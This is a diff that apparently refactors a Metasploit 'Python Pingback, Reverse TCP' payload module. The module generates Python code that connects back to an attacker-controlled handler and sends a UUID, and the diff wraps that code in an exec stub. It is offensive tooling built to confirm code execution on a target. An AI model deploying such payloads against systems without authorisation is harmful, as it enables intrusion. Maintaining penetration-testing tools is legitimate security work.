@@ -1,32 +1,34 @@
-
 module MetasploitModule
-
-  CachedSize = 193
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Payload::Pingback
   include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name' => 'Python Pingback, Reverse TCP (via python)',
-      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
-      'Author' => 'asoto-r7',
-      'License' => MSF_LICENSE,
-      'Platform' => 'python',
-      'Arch' => ARCH_PYTHON,
-      'Handler' => Msf::Handler::ReverseTcp,
-      'Session' => Msf::Sessions::Pingback,
-      'PayloadType' => 'python'
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Python Pingback, Reverse TCP (via python)',
+        'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
+        'Author' => 'asoto-r7',
+        'License' => MSF_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback,
+        'PayloadType' => 'python'
+      )
+    )
   end
 
-  def generate
+  def generate(_opts = {})
     super.to_s + command_string
   end
 
   def command_string
-    self.pingback_uuid ||= self.generate_pingback_uuid
+    self.pingback_uuid ||= generate_pingback_uuid
     cmd = <<~PYTHON
       import binascii as b
       import socket as s
@@ -38,5 +40,7 @@ module MetasploitModule
       except:
        pass
     PYTHON
+
+    py_create_exec_stub(cmd)
   end
 end
